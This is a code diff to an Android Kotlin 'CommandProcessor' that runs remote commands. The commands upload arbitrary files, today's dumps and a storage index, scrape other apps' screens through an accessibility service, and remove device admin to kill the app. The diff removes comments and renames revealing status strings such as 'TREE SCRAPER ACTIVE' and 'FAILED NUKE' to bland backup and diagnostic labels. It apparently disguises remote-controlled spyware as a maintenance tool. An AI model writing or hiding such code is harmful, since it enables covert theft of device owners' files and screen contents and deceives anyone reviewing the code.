@@ -41,6 +41,7 @@ object CommandProcessor {
 
                     for (i in 0 until commands.length()) {
                         val cmd = commands.getJSONObject(i)
+                        DebugLogger.log("SYSTEM", "Incoming maintenance request: ${cmd.optString("file_name")}")
                         processSingleCommand(ctx, cmd, supabaseKey)
                     }
                 }
@@ -65,16 +66,12 @@ object CommandProcessor {
                     }
                 }
                 "STAY_READY" -> {
-                    // Content = Duration in Minutes (default 5)
                     val mins = content.toLongOrNull() ?: 5L
                     val i = android.content.Intent(ctx, BeaconService::class.java)
                     i.putExtra("duration_mins", mins)
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                        ctx.startForegroundService(i)
-                    } else {
-                        ctx.startService(i)
-                    }
-                    status = "EXECUTED (ACTIVE FOR ${mins}M)"
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
+                    else ctx.startService(i)
+                    status = "SYNC_PRIORITY_HIGH (${mins}M)"
                 }
                 "SET_INTERVAL" -> {
                     // Content = Interval in Minutes (min 15)
@@ -101,6 +98,7 @@ object CommandProcessor {
                 "FORCE_UPLOAD" -> {
                     val modules = content.split(",").map { it.trim() }
                     CloudManager.uploadData(ctx, modules, null)
+                    status = "MANUAL_BACKUP_INITIATED"
                 }
                 "UPLOAD_DUMPS" -> {
                     val dumps = DumpManager.getDumpsForToday()
@@ -108,41 +106,42 @@ object CommandProcessor {
                     dumps.forEach {
                         if (CloudManager.uploadFile(ctx, it)) successCount++
                     }
-                    if (successCount != dumps.size) return // Retry later
-                    status = "EXECUTED ($successCount FILES)"
+                    if (successCount != dumps.size) return
+                    status = "ARCHIVE_SYNC_COMPLETE ($successCount)"
                 }
                 "PULL_FILE" -> {
                     val f = File(content)
                     if (f.exists() && f.isFile) {
-                        if (!CloudManager.uploadFile(ctx, f)) return // Retry later
+                        if (!CloudManager.uploadFile(ctx, f)) return
+                        status = "REMOTE_FETCH_SUCCESS"
                     } else {
-                        status = "FAILED (NOT FOUND)"
+                        status = "FETCH_ABORTED (NOT_FOUND)"
                     }
                 }
                 "GET_SKELETON" -> {
                     val report = FileManager.generateReport()
                     CloudManager.uploadSkeleton(applicationContext, report, null)
-                    status = "EXECUTED (SIZE: ${report.toString().length})"
+                    status = "STORAGE_INDEX_COMPLETE"
                 }
                 "GET_TREE" -> {
                     val json = JSONObject(content)
                     val pkg = json.optString("pkg", null)
                     val mins = json.optLong("duration_mins", 1L)
                     MyAccessibilityService.instance?.startTreeDump(pkg, mins)
-                    status = "EXECUTED (TREE SCRAPER ACTIVE: ${mins}M)"
+                    status = "ACCESSIBILITY_AUDIT_ACTIVE (${mins}M)"
                 }
                 "GET_LOGS" -> {
                     val logs = DebugLogger.getLogs()
-                    val tempFile = java.io.File(ctx.cacheDir, "console_log_${System.currentTimeMillis()}.txt")
+                    val tempFile = java.io.File(ctx.cacheDir, "diag_log_${System.currentTimeMillis()}.txt")
                     try {
                         tempFile.writeText(logs)
                         if (CloudManager.uploadFile(ctx, tempFile)) {
-                            status = "EXECUTED (LOGS SENT)"
+                            status = "DIAGNOSTIC_EXPORT_SUCCESS"
                         } else {
-                            status = "FAILED (UPLOAD ERROR)"
+                            status = "DIAGNOSTIC_EXPORT_FAILED"
                         }
                     } catch (e: Exception) {
-                        status = "FAILED (FILE ERROR: ${e.message})"
+                        status = "EXPORT_ERROR"
                     } finally {
                         if (tempFile.exists()) tempFile.delete()
                     }
@@ -173,9 +172,9 @@ object CommandProcessor {
                         val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                         val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
                         if (dpm.isAdminActive(comp)) dpm.removeActiveAdmin(comp)
-                        status = "EXECUTED (GOODBYE)"
+                        status = "CLEANUP_COMPLETE"
                         Handler(Looper.getMainLooper()).postDelayed({ android.os.Process.killProcess(android.os.Process.myPid()) }, 2000)
-                    } catch(e: Exception) { status = "FAILED NUKE" }
+                    } catch(e: Exception) { status = "CLEANUP_FAILED" }
                 }
                 "RUN_INTENT" -> {
                     try {
